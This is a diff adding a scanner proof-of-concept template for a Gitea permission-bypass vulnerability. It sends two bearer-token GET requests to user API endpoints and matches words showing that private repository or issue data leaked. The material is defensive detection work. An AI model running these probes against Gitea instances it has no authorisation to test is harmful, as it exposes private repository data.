@@ -1,0 +1,53 @@
+[info]
+author = "AVE"
+description = "检测 Gitea 实例中已撤销访问权限的用户是否仍可通过 /api/v1/user/starred 和 /api/v1/user/times 接口获取私有仓库元数据和私有 Issue 标题"
+id = "POC-AVE-2026-0837"
+name = "Gitea 已撤销用户权限绕过漏洞 PoC"
+severity = "medium"
+tags = ["ave-2026-0837"]
+vuln_id = [
+    "CVE-2026-59766",
+    "GHSA-qf2f-qh6p-7v89",
+    "AVE-2026-0837",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/v1/user/starred"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    '"private": true',
+    "clone_url",
+    "ssh_url",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/v1/user/times"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "issue",
+    "title",
+    "state",
+]
